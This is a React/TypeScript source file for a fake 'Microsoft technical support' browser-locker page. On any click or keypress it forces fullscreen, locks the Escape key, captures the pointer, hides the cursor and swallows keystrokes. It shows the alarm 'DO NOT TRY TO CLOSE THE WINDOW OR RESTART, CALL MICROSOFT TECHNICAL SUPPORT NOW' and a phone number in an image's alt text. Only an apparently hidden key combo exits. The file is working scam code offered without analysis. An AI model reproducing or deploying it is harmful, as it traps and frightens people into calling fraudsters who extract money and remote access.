import { useEffect, useRef, useState, useCallback } from "react"
import backgroundImg from "@/imports/background-1.png"
import footerImg from "@/imports/sticky.png"

type Phase = "idle" | "running"

export default function App() {
  const [phase, setPhase] = useState<Phase>("idle")
  const [buffer, setBuffer] = useState("")
  const [showFakeInput, setShowFakeInput] = useState(false)
  const [showToast, setShowToast] = useState(false)
  const toastTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null)
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const fakeCursorRef = useRef<HTMLDivElement>(null)
  const rafRef = useRef<number>(0)
  const gotJRef = useRef(false)
  const gotJTimestampRef = useRef(0)
  const cursorPosRef = useRef({ x: window.innerWidth / 2, y: window.innerHeight / 2 })
  const COMBO_WINDOW_MS = 3000
  const CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

  function randChar(exclude: string) {
    let c: string
    do { c = CHARS[Math.floor(Math.random() * CHARS.length)] } while (c === exclude)
    return c
  }

  const exitDemo = useCallback(() => {
    try { if (document.exitPointerLock) document.exitPointerLock() } catch (_) {}
    try { if (document.fullscreenElement) document.exitFullscreen() } catch (_) {}
    document.body.classList.remove("hide-cursor")
    cancelAnimationFrame(rafRef.current)
    setPhase("idle")
    setBuffer("")
    setShowFakeInput(false)
    gotJRef.current = false
  }, [])

  const keyDownRef = useRef<(e: KeyboardEvent) => void>(() => {})
  const keyUpRef = useRef<(e: KeyboardEvent) => void>(() => {})
  const mouseMoveRef = useRef<(e: MouseEvent) => void>(() => {})
  const pointerLockRef = useRef<() => void>(() => {})

  useEffect(() => {
    if (phase !== "running") return

    keyDownRef.current = (e: KeyboardEvent) => {
      try { e.preventDefault(); e.stopPropagation() } catch (_) {}

      if (e.ctrlKey || e.metaKey) {
        if (e.key.toLowerCase() === "j") {
          gotJRef.current = true
          gotJTimestampRef.current = Date.now()
          return
        }
        if (
          gotJRef.current &&
          Date.now() - gotJTimestampRef.current < COMBO_WINDOW_MS &&
          e.key.toLowerCase() === "i"
        ) {
          exitDemo()
          return
        }
        return
      }

      if (e.key === "Escape") {
        if (toastTimerRef.current) clearTimeout(toastTimerRef.current)
        setShowToast(true)
        toastTimerRef.current = setTimeout(() => setShowToast(false), 3000)
        return
      }

      if (e.key.length === 1) {
        const sub = randChar(e.key)
        setBuffer((prev) => (prev + sub).slice(-40))
        setShowFakeInput(true)
      }
    }

    keyUpRef.current = (e: KeyboardEvent) => {
      if (!e.ctrlKey && !e.metaKey) gotJRef.current = false
    }

    mouseMoveRef.current = (e: MouseEvent) => {
      const fc = fakeCursorRef.current
      if (!fc) return
      const locked = document.pointerLockElement === canvasRef.current
      if (locked) {
        cursorPosRef.current = {
          x: Math.max(0, Math.min(window.innerWidth, cursorPosRef.current.x + e.movementX)),
          y: Math.max(0, Math.min(window.innerHeight, cursorPosRef.current.y + e.movementY)),
        }
      } else {
        cursorPosRef.current = { x: e.clientX, y: e.clientY }
      }
      fc.style.left = cursorPosRef.current.x + "px"
      fc.style.top = cursorPosRef.current.y + "px"
    }

    pointerLockRef.current = () => {}

    document.addEventListener("keydown", keyDownRef.current, { capture: true })
    document.addEventListener("keyup", keyUpRef.current, { capture: true })
    document.addEventListener("mousemove", mouseMoveRef.current, { passive: true })
    document.addEventListener("pointerlockchange", pointerLockRef.current)

    const escHandler = (e: KeyboardEvent) => {
      if (e.key === "Escape") {
        try { e.preventDefault(); e.stopPropagation() } catch (_) {}
        if (toastTimerRef.current) clearTimeout(toastTimerRef.current)
        setShowToast(true)
        toastTimerRef.current = setTimeout(() => setShowToast(false), 3000)
      }
    }
    window.addEventListener("keydown", escHandler, true)

    const resizeCanvas = () => {
      const canvas = canvasRef.current
      if (!canvas) return
      canvas.width = window.innerWidth
      canvas.height = window.innerHeight
    }
    resizeCanvas()
    window.addEventListener("resize", resizeCanvas)

    const canvas = canvasRef.current
    const ctx = canvas?.getContext("2d")
    const renderLoop = () => {
      if (!canvas || !ctx) return
      ctx.clearRect(0, 0, canvas.width, canvas.height)
      const w = canvas.width, h = canvas.height
      const g = ctx.createRadialGradient(w / 2, h / 2, Math.min(w, h) * 0.1, w / 2, h / 2, Math.max(w, h))
      g.addColorStop(0, "rgba(0,0,0,0)")
      g.addColorStop(1, "rgba(0,0,0,0.15)")
      ctx.fillStyle = g
      ctx.fillRect(0, 0, w, h)
      rafRef.current = requestAnimationFrame(renderLoop)
    }
    rafRef.current = requestAnimationFrame(renderLoop)

    return () => {
      document.removeEventListener("keydown", keyDownRef.current, { capture: true })
      document.removeEventListener("keyup", keyUpRef.current, { capture: true })
      document.removeEventListener("mousemove", mouseMoveRef.current)
      document.removeEventListener("pointerlockchange", pointerLockRef.current)
      window.removeEventListener("keydown", escHandler, true)
      window.removeEventListener("resize", resizeCanvas)
      cancelAnimationFrame(rafRef.current)
    }
  }, [phase, exitDemo])

  async function startDemo() {
    if (phase === "running") return
    setPhase("running")
    document.body.classList.add("hide-cursor")

    try {
      await document.documentElement.requestFullscreen()
      if (navigator.keyboard && typeof (navigator.keyboard as { lock?: (keys: string[]) => Promise<void> }).lock === "function") {
        ;(navigator.keyboard as { lock: (keys: string[]) => Promise<void> }).lock(["Escape"])
          .then(() => { console.log("Escape key locked successfully.") })
          .catch((error: unknown) => { console.error("Keyboard lock failed:", error) })
      }
    } catch (err) {
      console.warn("Fullscreen request failed", err)
    }

    const canvas = canvasRef.current
    if (canvas && canvas.requestPointerLock) {
      try { canvas.requestPointerLock() } catch (_) {}
    }
  }

  // Trigger on any click or keydown while idle
  useEffect(() => {
    if (phase !== "idle") return
    const handler = () => { startDemo() }
    window.addEventListener("click", handler)
    window.addEventListener("keydown", handler)
    return () => {
      window.removeEventListener("click", handler)
      window.removeEventListener("keydown", handler)
    }
  }, [phase])

  return (
    <>
      <style>{`
        html, body { height:100%; margin:0; overflow:hidden; background:#233F5C; font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial; }
        .hide-cursor * { cursor: none !important; }
      `}</style>

      {/* Full-screen background image */}
      <img
        src={backgroundImg}
        alt=""
        aria-hidden="true"
        style={{ overflow: "hideen", inset: 0, width: "100%", height: "100%", objectFit: "contain", zIndex: 0, pointerEvents: "none" }}
      />

      {/* Footer image */}
      <img
        src={footerImg}
        alt="Windows Technical Care Support: 1-833-216-2312"
        decoding="async"
        fetchPriority="high"
        style={{
          position: "fixed",
          bottom: 0,
          left: 0,
          width: "100%",
          height: "auto",
          maxWidth: "100%",
          display: "block",
          zIndex: 20,
          pointerEvents: "none",
          objectFit: "contain",
          transform: "translateZ(0)",
          backfaceVisibility: "hidden",
        }}
      />

      {/* Fake typed input */}
      {phase === "running" && showFakeInput && (
        <div style={{ display: "none", position: "fixed", bottom: 18, left: "50%", transform: "translateX(-50%)", zIndex: 62, background: "rgba(6,6,8,0.8)", color: "#fff", padding: "8px 12px", borderRadius: 8, fontFamily: "monospace" }}>
          {buffer}
        </div>
      )}

      {/* Escape toast */}
      {showToast && (
        <div style={{
          position: "fixed", top: "50%", left: "50%", transform: "translate(-50%, -50%)",
          zIndex: 999, background: "#dc2626", color: "#fff",
          padding: "12px 20px", borderRadius: 8,
          display: "flex", alignItems: "center", gap: 10,
          fontFamily: "Inter,system-ui,sans-serif", fontSize: 15, fontWeight: 500,
          boxShadow: "0 4px 20px rgba(0,0,0,0.4)", whiteSpace: "nowrap",
        }}>
          <svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
            <circle cx="9" cy="9" r="8.5" stroke="white" strokeWidth="1.5"/>
            <path d="M6 6L12 12M12 6L6 12" stroke="white" strokeWidth="1.8" strokeLinecap="round"/>
          </svg>
          DO NOT TRY TO CLOSE THE WINDOW OR RESTART, CALL MICROSOFT TECHNICAL SUPPORT NOW
        </div>
      )}

      {/* Fake cursor */}
      <div
        id="fakeCursor"
        ref={fakeCursorRef}
        aria-hidden="true"
        style={{ display: phase === "running" ? "block" : "none" }}
      />

      {/* Canvas */}
      <canvas
        ref={canvasRef}
        style={{ position: "fixed", inset: 0, width: "100%", height: "100%", pointerEvents: "none", zIndex: 10 }}
      />
    </>
  )
}
